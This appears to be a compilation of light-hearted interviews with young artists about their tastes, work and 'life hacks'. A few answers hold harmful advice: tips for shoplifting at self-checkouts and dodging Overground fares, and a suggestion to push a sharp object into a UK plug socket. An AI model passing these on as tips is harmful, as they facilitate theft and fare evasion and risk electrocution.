The power to move anywhere in like 1 second. What do you call it? Teleportation? That’s the only thing I want as a magical power because I don’t want to read or hear someone else’s mind or anything like that because it would make my life complicated and I would be really confused. The only power that I think is beneficial is teleportation. Then I could just go to Korea to see family in one second, have a meal with Korean food that I cannot get here (like raw fish), and then just come back. Or like if I need to research something and need to see it for real, I’d just go see and come back.
Is there a life hack you would like to share?
Something like: Never believe the person that talks really good…or that is really good at talking. Never believe them. I try not to because I am the person who, when someone is making a joke and says a really random thing, will believe them. I’m really bad at lying so when you’re like that you don’t think someone else will lie to you. That’s why I need to be aware of people who talk really well and who are really fluent in everything. Some other people also told me this, people back home maybe slightly older people or maybe even people like me who are not actually very good at talking.
Question you would like to ask yourself?
How old do you think you are?
You know like I feel as though I have this grandma and this seven year old boy inside me. So sometimes when I’m really hyper with close friends I become a seven year old boy (not a girl, a boy). Then when I think ‘Oh what is life’, ‘Is it all bullshit?’ I become a grandma ‘ You know, just being healthy is the best thing’.

Has your work/practice responded to any particular event in the last year?
The first thing I think of is yes, of course. I turned 30 this year, or I knew I was gonna turn 30 this year, it made me self conscious and I have a lot of struggles with the question of reproduction and how that quite possibly would influence my life as a woman. And so, regarding personal events, I signed up to be an egg donor and that resulted in my most recent works which is all about reproduction…All sorts of forms of reproduction, so not only sexual reproduction but also social reproduction and digital reproduction. So yeah quite a particularly personal event, but it’s not only personal it’s also political, I guess.
If you could be an insect, which one would that be?
Oh cool, uhm…weirdly, the first thing that comes to mind is a grasshopper but I don’t know why. Really random answer.
A pair of shoes you wish you owned?
Oh my god. These are all things I’ve never thought about, even the shoes! My feet are really difficult so every year I buy the same shoes: these, the ones I have on. I almost never wear other shoes. My feet are just difficult, I have really wide feet, they don’t fit in like really girly shoes hehe…which is also good because I’m not girly anyway, so it’s fine. These are standard brand vagabond shoes. The only thing that I’m worried about is that it’s leather and I really don’t want to wear leather anymore but, I don’t know, I still wear them.
Best horoscope to read/look up? (If you do read horoscopes)
The one that tells me that everything is going to be ok?! This is why you read it right? Because you want to read that everything is going to be fine and you’re going to be completely happy and everything will work out. That’s what you want to read.
I was reading a book where a girl reads five different horoscopes to choose her favourite, and the one that says that everything will be great.
That’s me! That girl’s me!
Last google image search?
Oh I do know, ha! It was Saturday evening when I was looking for images of oysters, because I’m making a video with oysters as narrators… So I needed an image of an oyster to animate faces into them and give them a voice. The oyster with all its gendered connotations and its ecological role in climate change is going to be the intertwined thread. I think the new video I’m working on is going to explore the complexities of consent and shame. The oysters are going to give confessional speeches of how they’ve been assaulted or harassed. There’s a scene when they’re on a plate, you know with ice, and then they start singing, shouting and crying.
If you could collaborate with any other currently living artist, who would that be?
To be honest, as an artist I’m not the best at collaborating because I kinda need to reach a really weird place in my head to make work. It’s a way of getting the demons out I guess, without it sounding too therapeutic, it would be hilarious but impossible to try and share that process with someone else. But in other aspects of my life I love collaborating with people, like when I used to organise techno parties with my friends, or when I teach I feel like that’s a form of collaboration as well – those are all forms that seem to come naturally. With art not so much. I totally disagree with myself because I do collaborate all the time! With actors, voice actors and through re-appropriated material. So, no I do collaborate! You see? I’m doing it again, the existential spiral – why can’t I just say: Rihanna.
The most memorable wall colour of your bedroom?
Well I once lived in a squat in the Hague and I knew I had to leave because the building was going to get demolished. So I asked all of my friends to come over and spend the night. I asked them to bring markers and to leave messages or drawings or whatever on the walls as I was going to get kicked out anyway. It was a way of saying goodbye I guess…It was ugly haha, it was really really ugly, I was an 18 year old living in a stupid squat place, my friends were not losers but you know…no one really cared. So it turned out to be a really disgusting thing.
One of the things you’re proud of accomplishing everyday?
Waking up? I mean everyday is kind of like: Oh I’m still here, yay!
Jennifer Lopez or Madonna?
Madonna. I was a big fan of Jennifer Lopez when she started out but there is no competition, it’s just Madonna.
Do you have a lifehack you could share with us?
When you have gum stuck on a sweater or even in your hair you put peanut butter on it! Because of the oily base, it works. You can first put it in the freezer and then you put peanut butter on it and it then comes out. I mean, you can’t stick your head in the freezer of course haha. Or you cut your hair, just like I did!
Do you have a question you’d like to ask yourself?
That’s hard…I have a tendency to think too deep anyway. So then this becomes like an existential thing suddenly. I can’t really avoid it, the problem is that I don’t seem to be able to keep it casual. For instance I have a really big problem with small talk. Most of the time I just catch people completely off guard by saying or asking something way too personal. Especially in England, I feel like I’ve offended people because I’m way too straight forward. I’ve really tried to tone it down but it’s hard.
So I’m not sure what to ask myself…I can ask something practical like:
Why don’t you just make an appointment to go to the dentist you idiot? I need to go to the dentist, I’ve never been to the dentist in England. I’m a little bit afraid because a piece of my tooth broke off and now I’m postponing my appointment.
The question could be: Are you afraid of the dentist?
Yea, ok my answer would be: slightly, I’m slightly scared.

What’s your favourite colour?
I don’t know, it’s probably black just because it’s easy to match things with it and it’s quite neutral… yea… although is black a colour?
If you could have been born anywhere else than your actual birthplace, where would that be?
Somewhere in the north of Britain: Scotland or Glasgow… a different city in the UK (as I was born in London, I’ve grown up in London and I’ve never left the city really). I think London gives a very limited understanding of the UK if you’ve lived there solely (as a lot of Londoners found out in the referendum last year). While I am interested in a lot of cultures outside of the UK I feel like I don’t know the UK as well as I should.
A cartoon character you aspire to be?
Probably someone like Wolverine. I’m quite attracted to this kind of intuitive ‘macho-ness’ even though that’s not really who I am, I wouldn’t describe myself as a matcho. I’m very interested in macho culture and heteronormative maleness. Wolverine is someone you’re attracted to and repelled by because he’s a good guy but he kind of flies off the hinge and gets a little bit mad and does stuff without thinking.
If you were a fly, who would you spy on?
I’b be interested to spy on Donald Trump just to understand what is behind the media image of him and whether he actually genuinely spends all his time watching Fox news and getting annoyed that he’s not getting covered in the right way. Just for my own peace of mind I’d want to understand that there’s hopefully someone that has some kind of strategy.
George Michael or Michael Jackson?
Haha… George Michael. He’s someone that was very in control of his image, he was very playful and knowingly playful. Michael Jackson was great of course, in terms of his music (haha) but I just feel as though he was someone who had a massive team behind him.
If you could go on a date with a dead artist who would that be?
A dead one… I think I want to say Andy Warhol. His work is so relevant now; the way he turned his practice into a business. I wonder what he would think of digital culture… oh, and I would like to ask him about his relationship with Basquiat… it might make the date awkward!
The place where you get most of your work done?
At my desk, in my flat, in my laptop. I don’t have a studio… That’s just a reality of living in London. Everything I do is on my laptop, I’ve never had access to a studio.
The thing that you’re proudest to have achieved this year?
I think winning the Tenderflix prize (….with you! hahahaha). It’s an award that I’ve followed for a few years and people who have influenced my work have won it. I think it’s a really exciting prize because I feel as though the potential for video art as a medium is so great right now with access to production technology.
An Instagram account everyone ought to know?
It’s an account run by 2 designers who just photograph packaging left in the street and then tag the designers who are responsible for designing that packaging. I think that’s a really great way of connecting the work of designers and creative practitioners to wider problems; implicating designers in littering and anti-social behaviour.
Your go-to fast food?
Pret A Manger. The staff project this happiness in a way that’s too genuine like they’ve been too well drilled. I feel a bit conflicted about it because there is a Pret in almost every single new retail development giving no space to independent cafes but. It’s a guilty pleasure!
Do you have a life hack to share with us?
Always put a piece of blue-tack on the camera of your laptop otherwise you never know who will be looking at you.
A question you might like to ask yourself?
Has your work/practice responded to any particular event in the last year?
In my case, yes, a film I’ve just made ‘The Green and Pleasant Land’, it’s being exhibited at Arebyte gallery. I guess it’s a post-Brexit film, it’s an animation, a fantasy about British history. It’s a direct response to Brexit but I feel as though it has taken me away a little from my core interest that is the relationship between architecture and built environment, so It’s something I’m going to go back to.

How do you read at bedtime whilst lying down in bed?
Actually the reason I read at night is just to fall asleep. I find that it’s a really nice way to induce sleeping. I don’t really read much. I only read when I need some basis or inspiration for my work, it’s not really my go-to or that entertaining for me… unless it’s summer, I really like to read during summer, like after going for a swim and laying in the sun, that’s when I usually read.
What would you do if you weren’t allowed to use a computer for the next 3 years?
Oh fuck! [haha] I guess I’d use my iPhone. Maybe I would draw more or I would start painting… but I would still need to use my iPhone… how could I access all the references I use for my work? I’d have to, there’s no escape from it.
Corgi or Chihuahua?
That’s really hard! Both cute. Corgis can twerk but Chihuahua are more fascinating to me because they’re as big as cats but they’re dogs…and they’re really bitter and angry. So yeah, I think Chihuahua because they’re true jerks (and they’re cat size).
The last thing that you typed into Google?
It’s probably really embarrassing. Oh ok, it’s ‘Drake on a wheelchair’… he used to be an actor (in Canada because he’s Canadian right?) in a sitcom there, don’t know which one but he was on a wheelchair. People might get offended, I don’t know, I’m not making fun of the handicap, I was just looking him up.
If you were an important textbook figure (like the ones studied in history books) who would you be?
Let me think about it…because I didn’t really study that much history. Maybe I’d like to be Leonardo da Vinci minus the raping of young guys. I really liked him as a figure… or Lady Gaga hehe [historical].
The top 3 things that terrify you?
You know when elevator or subway doors close, I’m scared that I will get stuck and that they will crush all of my bones. The second one is ‘pigeons’, I mean I love pigeons but I’m scared that they’re gonna hit my face when I’m walking or that they’re gonna poop on me. And the third one maybe ‘dying alone’…really millennial of me.
If you could feature in somebody’s music video, who’s video would you be in?
Either David Bowie’s ‘Life On Mars’ (it’s my favourite video of his) or Rihanna of course, she’s like the coolest person alive right now.
Your favourite TV show villain?
I really really like Bob from Twin Peaks! …terrifying
If you could invite a living artist for tea and cake who would that be and what sort of cake would you offer?
I don’t know…definitely a red velvet cake because that’s my favourite..but who should I invite? My first thought goes to Mark Leckey because I really like him but maybe not. I’ll say Will Benedict, and I would offer him a space cake (hehe).
Life hack?
Going back to the falling asleep question, actually I always had trouble falling asleep. So I think the best way for me to do that now, aside from reading (of course), is setting up a completely fake story inside my head. What I do usually is put myself inside these environments I’d really like to be in. What I used to do when I was really young was imagining myself inside the Harry Potter castle and I would try to come up with every single detail for the story. Every night I would do that (I don’t do it with Harry Potter anymore) and it would always be the same and I would never get to live inside that thing in my mind because I would just fall asleep in under 5 minutes. So I guess that’s an act people could try if they’re weird enough…
Is there a question you would like us to ask you?
What’s your favourite colour?
I think grey…a 50% grey, not too dark but more on the light side.
Kind of like the background in software for designing in 3D?
Yes, exactly that one!

How do you find the balance when a work of yours includes or speaks about a specific person you know?
That’s a hard question, I was expecting something like: What colour are your socks? Haha..
With regards to this question I’d say that not being ‘explicit’ is essential and it depends on whether or not this other person is aware of the work you might be creating. I also believe that a balance needs to be found in something that is both interesting to me in terms of the other person or the relationship to that person, but also how this tie might be similar in a viewer relating to the experience. As a viewer, I might not be as interested if I’m not aware of the relationship/bond between the artist and subject.
I was doing this for my thesis piece: My work was about my former roommate. She was still my roommate whilst I was making the work and she was not at all aware of the fact that I was doing this.. Still now the situation is unclear, I always use vague terms.. haha my roommate still doesn’t know that she has been the subject of my thesis piece.
One existing building you wish you could live in?
Damn… I don’t know.. maybe In some patio home of Miles Van Der Hoe. Yes, actually I’d really like that: huge windows and calmness, you really feel calm in there… I’d watch everything from the windows!
One habit you wouldn’t be able to give up on?
Putting an embarrassing amount of pepper on whatever food I’m eating.
The best thing to eat in your hometown?
The tortellini of Modena! No doubts on that one!
What’s on Santa’s list?
A pair of winter boots for Switzerland. It’s so cold here right now…
What kind of boots? Like rubber boots?
No, something a slight bit more elegant. I need to upgrade my current status, I can’t keep going around in sneakers (haha)…
If you were to be gifted 3 tonnes of a specific material to make your art, what would it be?
The only thing that’s coming to my mind right now is whipped cream. I’m imagining something huge ahaha.. but maybe I should say something a little more serious, in fact, I think I’ll say amber. Amber is my favourite material right now.
The last thing you liked on Instagram?
I’m quite scarce on Instagram to be honest. The last profile I followed was victorinioxswissarmy and I think I liked some of their posts.. [checks instagram]
Actually, it’s this post by Lorenza Longhi of an art space we opened up within the university (Master Art Visuel, Ecal). The space is called ‘wishing well’. Every time there’s a post about it from an external person, there are like a thousand likes from everybody in the class.
Is there a language you wish you were fluent in?
Well, English. I really suck at English…
If you had to bring your grandma to an exhibition, which one would it be?
I think to Lauvre Prouvost (the exhibition she did in Hangar Bicocca in Milan). Mainly because that exhibition was on her grandpa, so I feel that it could be something quite interactive where my grandma could have fun without being too perturbed.
A life hack to share with us?
Oh I do something: I peel an egg by putting it in a glass full of water. When you make a boiled egg and then want to peel it, you put it in a glass of water, block the open part with your hand and shake.. the egg peels itself!
A question you’d like to ask yourself?
I hate asking questions.. maybe a breakfast question? Like now I learnt how to eat yoghurt… I never used to have it but it’s quite fundamental for me now… I have it with little seeds, or muesli or whatever.
Actually, one of my big questions these days is:
How do you read at night at bedtime whilst lying down in bed?
I don’t think I’ve found a solution to this, not even coffee helps… it’s quite deadly.. so yea, I’m still looking for the answer.
Before I used to be able to do this but now I can’t even watch movies, I just fall asleep midway through them. Maybe I tire myself out more, but I think I might just be getting old. The cinema for me is just banned, I sleep big time and need to be awake at the end. We’re getting big, we have more problems and are more stressed so the moment we sit down we fall asleep hehe…

Which song do you remember off by heart?
Uhmm..Many songs! I recently went to a Placebo gig, so I’d say ‘Special K’ by Placebo.
Haven’t heard their recent stuff.
Don’t, you will cry of disappointment…
What is your favourite kind of museum?
‘The Museum of Life’, no joking…I guess artist run spaces because you never really know what to expect and you feel more comfortable in them because they don’t feel so sterile. Are they museums though? If not if you mean any type of museum, not necessarily an art museum, I’d say the Geffrye Museum in Haggerston, it’s amazing, it’s all replicas of interiors,it’s a museum on interior design and furniture.
What was the scariest thing you did in the name of art?
Driving in Saudi Arabia…although to be fair it wasn’t in the city but there were some people around. I drove not very far because I don’t know how to drive (haha), it was an automatic car, I drove in a straight line. It was a performance for a video I did about the driving ban.
Is there an app that you hate but use anyways?
My period tracking app called Period Diary and of course the logo is a flower. I hate it because if you get it wrong it ruins the whole cycle, I’ve had to delete and redownload it…I should comment, write a review.
What’s the last thing you ate?
I had a chicken soup from Fulham Tarts. It wasn’t that great but it looked healthy so it was a step up.
The last person you followed on instagram?
Let me check, I don’t remember, I’m actually curious. Ah, it was ‘papalokoparty’, it’s like a queer techno party, it’s actually good! It happens in Angel, in Electrowerkz, it’s great that this place exists, it used to be a massive warehouse/factory and it’s right behind Angel station. They do a lot of parties.
If you were stranded in the desert, what’s the one (non electronic) object you’d choose to have with you?
Non Electronic? That’s difficult… A Shovel maybe? I’d dig dig dig until I find water. Is that a thing? Is it possible? At least it would occupy me.
It sounds very creepy, like digging for your grave.
I mean it’s that, either I find water or I dug my grave, it kind of goes full circle.
Cheese or yogurt?
Cheese, I hate yogurt. I’m not a big fan of cheese either but yes, cheese. It’s just with yoghurt, I’ve been traumatised, I’m Greek I’ve had to have it so much that I can’t have it anymore.
What’s the best Zodiac sign? The worst?
Oohh, I’m so into zodiac signs! I’m tempted to say pisces, because I’m pisces but I must say that the best zodiac sign (love and hate relationship but mostly love) is the scorpio. So, the worst, also scorpio.
Life hack?
This is not a hack but I find it really cool, you know those leaves that sting, Nettles, next to them grows the plant that soothes the sting. Isn’t that amazing? But that’s incomplete information so it’s not very useful haha..
Oh I have one actually that has been very useful for when I moved to England: Sticking sharp objects into plugs! You know the plugs, like the ones in Greece that accommodate plugs with two bits (and how those don’t really fit in English plugs unless you have an adapter). Well, you need to insert a sharp object in the top hole and it unlocks the mechanism for plugs to fit into the bottom holes… I hope nobody dies after we give this advice!
Do you have a question you’d like to ask?
A Challenge I am facing now is with work that is very personal and when it has to do with real people? How do you include it in a work in a way that is both comfortable for you and the other person?
How have you been facing this?
Oh you ask, I thought you wouldn’t ask hehe. I use metaphors and little clues, it excites me when I use certain details (even if metaphorical or symbolic) that relate to anyone but the specific person will know that it’s about them because it’s very specific to them. So, the idea that people look at the work and see what they want to see, but that one person knows that that moment that it’s them, that kind of intimacy…

Who’s the last person you felt like slapping?
Ohh… there’s a few. It’s difficult because I wouldn’t go and slap them, but I feel like I just want to shake them… or why is not going well.
What colour are your socks?
Black. They are often black, but I’m trying to change that.
Would you rather own an Anish Kapoor or an Ai Wei Wei work?
I don’t know… I’m not the biggest fan of either of them. I think I’d probably rather have Ai Wei Wei.
A dead person you wish you could have taken a picture of?
Virginia Woolf, first comes to mind. She was so beautiful and I love her thinking.
Your favourite time of the day?
It used to be morning for sure and now… I think it’s actually sunset. So whenever the sun is setting, because in London the sky is always quite magnificent. So yeah, when the sky goes really red, most of the time you have clouds but at the sunset the clouds become an amazing spectacle.
I did take a lot of Instagram stories of the sky, because I wrote my dissertation on my roof, hence the twilight.
The best exhibition you’ve seen this year?
One of the really beautiful ones was of Alice Neel at the Vincent Van Gogh Foundation in Arles, (there was the photography festival on there, which I should be more interested in but I didn’t care about anything because that show was so beautiful). I only just discovered her and I loved it. This one just stuck with me, it was so rough, visceral and honest…and she’s a portrait painter and I’m a portrait photographer (not only, but I make work about people) so that one really touched me! There was this Andy Warhol painting that was unlike any other portrayal of him right next to a Harlem Mother with her child. She really knows what to show and what to omit and I loved how a lot of the paintings were ‘unfinished’ but it was just enough, you didn’t really need anything else.
What are the most comfortable shoes you’ve ever owned?
The ones I’m wearing now! They are from Ecco, and I wish that I had bought 3 pairs so that when these go bad I just have another (haha). They are kind of like boxing shoes…but ohh yea, they are just the most comfortable shoes in the world. As a photographer and an assistant: Shoes are important!
Actually, funny enough, I have another story about shoes. Recently I was commissioned to photograph Julie Verhoeven, she’s an illustrator, wonderful artist and she’s worked in fashion quite a lot so she’s famous for the fashion illustration. Anyways, so when I got the commission, I googled her and I couldn’t believe that one of the first images that appeared on google search images. It was this illustration of a girl that I had taken inspiration from as a teenager, I had painted it on a pair of white sneakers that I owned…and now 10 years later I get a commission to photograph this person! And actually my portrait of this artist looks so similar to my illustration on my shoe!
The one best thing about going home to your family?
The warmth and the feeling of safety in a way that I can switch off. I feel that like when I go back, a big weight gets lifted off my shoulders… where for a little moment it’s almost like being on holiday from being an adult! Ah and my brother!
What TV show would you like to appear on?
I don’t think I would like to appear on a TV show. No. I’d like to be a member of the crew when Simon Schama was doing the BBC series on painters, they were amazing… but I wouldn’t want to appear on one (haha). I don’t really watch TV shows… when I was really low, just finished my BA and had no work, I watched the whole of Dr. House series. It was such an intense and really sad experience and I just I don’t want to fall into that. I don’t really like being in front of the screen, my work is completely non-digital… so I can see the appeal of ‘relax’ by watching a TV show but I’m just not into it.
Life hack?
When you have hiccups: drink really slowly a spoon full of lemon juice.
Is there a question you would like to ask yourself?
I think that a lot of the questions that I would like to ask myself are a lot more on a personal level and I’ve been asking a lot of questions to myself… in the end it’s about being true, true to oneself. Actually, recently I think that I’ve allowed myself to be more open. If you’re trying to be as transparent as you can, you might not need to ask yourself questions… just be open to the questions by others. Lately I’ve been asking myself: What do I want my work to do? It’s personal and autobiographical but at the same time it’s not showing me there…My work is about contemporary moments that I find are beautiful…it’s about care, attention and stopping for a moment.
Actually one other question is that you were selected for the last ‘Bloomberg New Contemporaries’, how’s that been?
It was probably one of the best art experiences I’ve had because we were selected and that was it, there wasn’t one winner. We were really looked after, it felt genuine, the speeches by the chair and the director were touching, we have a saying in Slovakia that says ‘They didn’t put a serviette in front of their mouths’; they were not scared of addressing Brexit or the fact that art schools are getting so many more students and the frustrations of people paying so much more money…they were addressing the core. I was very much in the photography world before coming to the RCA and because New Contemporaries is very wide and doesn’t only deal with photography it’s very different to the previous very photographic competitions I applied to before…I literally applied half an hour before closure! I’m very honoured and happy to be part of it.

What’s the fullest you’ve ever been?
I just got back from a little tour of Italy, I went to an Italian wedding and it was the most insane event I’ve ever been to. The church was on top a hill overlooking the ocean in Tuscany, it was attached to a castle and inside this castle there various rooms with different events going on. There was typical Tuscan charcuterie in the courtyard, a seafood section on the terrace, dinner was a 5 different knives and forks scenario, in which I’m not at all well versed in, everything so lavish…it was nice…and because of my slightly adverse opinion on marriage and stuff like that I have to find a way of making it somehow ok for me, so on my shoes (because I had to buy a pair of shoes for this) I wrote in correction fluid (in really small writing) ‘Smart shoes for Weddings…’ on shoe and then on the other: ‘…and funerals’. But yes, I was full.
What behaviours make you think a person is creepy?
I think it would be the polar opposite of what’s conventionally creepy..because I have a lot of the conventionally creepy attributes. I’d say 9-5 jobs and wearing a suit at work I suppose, it’s pretty creepy.
What’s the last thing you fixed?
I fixed a washing machine actually. I think that was the last thing, instead of fixing a cocktail or something like that…I learnt how to do it using youtube tutorials.
A music guilty pleasure?
I try not to say that they’re guilty pleasures…but my go to answer would be Coldplay, the first three albums are fucking amazing, oh and some U2 songs. I guess that would be it, I don’t feel guilty about it; more like what would be perceived as guilty pleasures.
If you got gifted a holiday, what would you do?
Usually when I go on holiday I tend to go alone, in fact I’ve just come back from Bruges. I went on my birthday – a solo mission to Bruges – walking around gothic Bruges, listening to a recently discovered German band called ‘Gas’, some really dark, droney techno from the 90’s…I feel like I’m on holiday all the time, experiences blur into one another, not having a set structure for my life…I guess I would carry on doing what I usually do. I like to joke and say ‘my life’s a holiday…and I want to go home’ sniff sniff…
If you could transform one part of your body, what would it be?
Transform, I guess you’re being clever with the wording; not using ‘better’ or ‘make perfect’…huge tits! No, joking. I guess it would be my spine, from skateboarding 20 years I’ve got an S-curve in my spine due to standing on one foot…I guess I would make my body proportionate and how it’s meant to be. I went to 4 different chiropractors to try and sort it out but it’s an ongoing problem…It’s not like having a gun instead of a leg or anything, but it would be nice.
Your favourite type of cat?
I’m not very good with breeds but my favourite cat is called Beatrix who is white and completely deaf (as I think 50% of white cats are meant to be). It’s crazy because she’s got a constant solemn expression on her face but she’s the happiest cat in the world. She’s also mad on water, so you’ll be brushing your teeth and she’ll be going in the sink. So yeah, it would be Beatrix, I don’t know what breed she is but I think she’s Russian.
If you had an art collection, what would your top 3 pieces be?
This is very difficult to answer, I see no real fundamental reason to own any work, if it exists in the world and I have engaged with it, you have that, which can’t be taken away, though as you gain a myriad of different experiences the work might change for you. There was a time when I really liked Jenny Saville paintings. I remember having a book of hers from when I was around 10 or something. I would just obsess over her work, I remember going to see a solo exhibition in Oxford years after, the anticipation before entering felt similar to the one you have before going to a gig (of a music artist you admire).
But yeah, I think I would abstain from having any art.
One thing people take too seriously?
My immediate answer would be ‘life’. Yea life, themselves, I think there are so many things that people take too seriously, including myself, when it all boils down to it nothing matters, we’ll be in the grave soon.
A life hack you might like to share with us?
I almost feel bad saying these ones because they reveal a slightly sketchy side of my character but: If you choose to steal food from the supermarket, make that supermarket Waitrose or Marks and Spencer, because with the more middle class shopping Centre’s, the weighing scales aren’t as sensitive, so you can bleep 2 packs of salmon through and put them down at one time. I don’t know why exactly, but I guess it’s because they don’t want the alarm to go off all the time, they just want it to be a nice smooth shopping experience.
Also, for bunking the Overground, you’ve got to get on and get off stations with no gates (obviously). Sit in the middle of the first carriage, this gives you a view down the whole train and if the ticket officer gets on they will usually turn left to inspect the tickets of the people at the very front, hence your position in the middle which enables you to turn and casually walk down the train when their back is turned. I sometimes pretend to make videos of the views from the train window on my phone, to look like an innocent wondering tourist as opposed to a bunker.
Is there a question you would like to ask yourself?
I try to imagine this as if there were a me sitting there. I guess it would be: What question would you ask yourself? I’ll just have to keep asking it until something happens. But yea, the bigger ones, you know what they are; they can be frightening and fun.

How do you like your eggs?
A la coque (soft boiled) with ‘mouilletes’ (sticks of toast bread) and butter. You couldn’t find an answer more French…with salt and pepper!
A famous person you wish you looked like?
Looked like? Physically or globally? Physically, Natalie Portman (not very intellectual). If it wasn’t physical, Chantal Akerman (definitely more intellectual).
If you had to burn one of your works which one would it be?
Burn one of my works? All the paintings that are in my apartment that take up space and that I don’t look at anymore. They’re in a big pile. I haven’t painted for five years so now they’re just in a corner and I don’t pay attention to them. I don’t have the heart to throw them out so maybe burning them would be a good way to recycle them. They are covered in dust. They are acrylic and drill paintings: they’re these huge canvases where I painted in acrylic and then pierced tonnes of small holes through them. They’re very light but they’re quite big and take up a lot of room and are too fragile for me to open up and put them in my room…I don’t appreciate them anymore. It’s a problematic painting to burn.
What are you reading?
‘Le petit manuel de la composition typographique’ by Muriel Paris (the small manual on typographic composition). She’s so French, she’s named Paris.
Can you give us a image from your phone from this past week?
Croissants, cake or Ice cream?
Croissants. So French. With an egg “a la coque” and some “mouillettes” (haha).
An artist you’ve been looking up lately?
Clement Cogitore https://clementcogitore.com/
He’s on show at the Bal, and if you pass by Paris you should absolutely see this, it’s incredibly beautiful. He’s the one who made the movie Ni le ciel ni la terre (The Wakhan Front).
What is an everyday thing that gives you anxiety?
Sex.
(Haha) Let me think of another option..maybe starting a new project, I think my work in general, I think about it at night, what I’m going to work on tomorrow…
If you could spend one day with a now dead politician who would that be?
Simone Weil.
The best place in France?
La Ria d’Étel (that’s in Breton, the official name is Rivière d’Étel). It’s a place in Bretagne near the Gulf and the Barbillon. It’s so beautiful, the landscape constantly changes. It’s a lagoon with many different small islands and the water comes up and down, here’s a screenshot:
Would you rather lose your laptop or lose your family photos?
My laptop. There’s nothing inside my laptop because I have copies of my work everywhere. I often make copies and delete folders. Actually once I deleted an important folder with texts I had written; recently I looked everywhere for those texts as I’m trying to build my website but I can’t seem to find them, I must have deleted them by accident. I’ve tried retracing them in my inbox to see if I sent them to anybody by chance but no…
You’re making your own website?
Yes, that’s why I’m reading ‘Le petit manuel de la composition typographique’! I’m trying to find a graphic identity. I find that many artist websites look extremely similar, it’s always this very clean looking modern typography with the little icon on the left and the slide of images on the right. I’d like to work on something a little more fun with gifs and other elements. It’s delicate because it mustn’t give off fake impressions (for instance: it mustn’t look like a fashion website)…it’s complicated, I still haven’t found the answer. I work a lot with image textures I’m thinking I might use textures in the background extracted from video frames or pixelated qualities from images zoomed in.
Like Hack?
How to cool down a beer very rapidly: You wet paper towels with water and wrap them around your beer. You then put it in the freezer. It cools down twice as fast as if you don’t use the wet towels. It works!
Is there something we didn’t ask you that you’d like to ask yourself?
Who’s the last person you felt like slapping?
My previous boss. I was working in a production company, we went to Cannes together, just before the Festival de Cannes he used to call me everyday until 11pm to re-work the design on invitation cards etc. I got so fed up that I refused and the day after I refused I got a little note on my desk saying ‘You can go fetch my shirts at the dry cleaning place’. Since then I quit (haha)!

Do you think that you perform for social media?
Not really..not at all. It’s an interesting question but I don’t believe that I perform for social media. I like to think that I have more of an ‘outsider’ point of view in terms of social media; I’m interested in it but I’m not part of it. And if I’m part of it, I wouldn’t call it a performative action but I’d call it something different…Well, like it do it sometimes with the eggs but I’m also very conscious of the fact that I don’t want to be doing a performance (with my body, selfies etc.) on social media.
What’s your latest guilty pleasure in terms of item of clothing?
I did buy a few things in New York when I was there…In New York everyone was crazy with sales and it made me super anxious. I remember I spent one whole night thinking that I had to buy something just because of sales and I ended up not sleeping because I got really anxious. My latest guilty pleasure would be these Gucci sunglasses, they’re really amazing! Of course I didn’t buy them, they were like €400…
What’s your favourite sweet and salty dish?
Sweet plantain chips with goat cheese! I just had it in Venezuela and it reminded me of my childhood…I was like omg I need to eat more of this but of course you don’t find the sweet ones in Europe; the green ones are the ones you usually see in Latin American markets but the other ones you only find them in Caracas. That dish is amazing, that’s the one for sure.
Can you describe your instagram account in 3 words?
Melting – Eggs – Sexiness
What animal would you feature in an art work?
A frog. It just came to my mind, but yes, I guess a frog. A very slimy frog. I love the hands of the frog (do you say hands?). I find them really sexy. I’d get like a really cool one with a shiny colour and slime…and I’d go for a really small frog, not the big ones, that’s disgusting. I’d choose a very sleek and smooth little frog.
What’s the last thing you watched on youtube?(no cheating)
Oh yea [haha] there’s this new Reggaeton album by Ozuna that’s amazing:
If you could work with one famous artist, who would that be?
I think Alex da Corte. I met him in New York, he’s so nice and really cute person. So yea, I guess him because of the aesthetic and I think it would be really interesting to work with him in space; on making a space.
What bothers you the most at 7am in the morning?
Not having avocado in my house and not being able to have avocado in the morning. When I’m really hungry and I want my eggs with avocado and I don’t have them…I’m just ‘fuck I need to go out and buy them…Or when the avocado is not ready to eat, that’s just fucking fucked up haha. Not having avocado and having to leave the house to go buy them, or not having eggs…I guess just not having a complete breakfast, that’s just sad and I get really pissed.
Gold or silver?
I think silver…melting silver.
Any good life hacks?
I think it’s related to food, as always. I hate the garlic smell on my hands, my grandma always says this: after you chop garlic, you rinse your hands under cold water (don’t use soap) and then clap, like an actual round of applause, your fingers need to be open. And that actually works, it’s really funny because it does work. You’ve never done it before?! Oh and you must not dry your hands with a piece of cloth, you dry them, by clapping.
Something you would like us to ask you?
How do you like your eggs? I like mine boiled. I’ve discovered that like 5 minutes 35 seconds is the perfect egg cooking time for me. Sometimes you cook it somewhere else, you boil it in another house and the timing is different…then sometimes it overcooks, the egg gets too hard and I get pissed. I like my boiled eggs really soft and runny.

Do you like street signs?
Yes, I guess so. I’m a bit obsessed with ‘safety’ so I always look at signs (like the ball games ones) that are in london in all the council flats, and in like basically every public space. There are signposts with regulations of what you can and cannot do. In London I find that everything is incredibly regulated, especially in public spaces.
If you had to chose your last meal what would it be?
I have already thought about that! I would have a Spanish omelette (the classic one with just potatoes, onions and eggs). And I would also have tomato salad, but not just any tomato salad, it needs to be with the incredible tomatoes you get in Spain (I’m guessing that in Italy you have them as well). They’re really huge and ugly but on the inside they’re so rich and intense that they’re almost burgundy… It just brings tomato to its highest level of accomplishment. For me that’s my last meal.
I think this is the most Spanish answer I could come up with! And it’s funny because actually the potato and the tomato are Mexican but they are the main ingredients in Spanish cuisine.
If you owned an object with superpowers, what would that object be?
I think something related to sustainability and climate change because that’s one of my main concerns at the moment (my dad works in this domain so I’m quite aware of it). Possibly a machine that creates local produce in everyone’s homes and that at the same time recycles the soil…that way we don’t need a food industry anymore, we’d produce our own food in our own homes…the food industry is a huge component of the damage we’re doing to the earth. I think this self sustainability would help climate change quite a lot.
What’s your most popular self portrait on Instagram?
This one is related to my art practice: And this one to my music:
Insert a screenshot of the last thing (movie/ tv show/ video) that made you cry
Oh, I cry with an advert so that’s super easy! Adverts that show a family with a mum that’s moved because her son is coming home…in advertising they know how to generate empathy like that. In any case, this is the last movie that made me cry a lot:

So, I’d like to cook predominantly for women. They’d be: Angel Olsen, she’s alive, she’s a musician and I really like her music and her lyrics. Then, Frida Kahlo, I mean it’s a cliche but she’s the feminist I admire the most. Hannah Arendt, she’s an incredible philosopher, the discussion would suddenly become quite serious but whatever..and maybe my great great great grandmother, just to see who she is.
If you invented a cocktail, what would you call it, what color would it be?
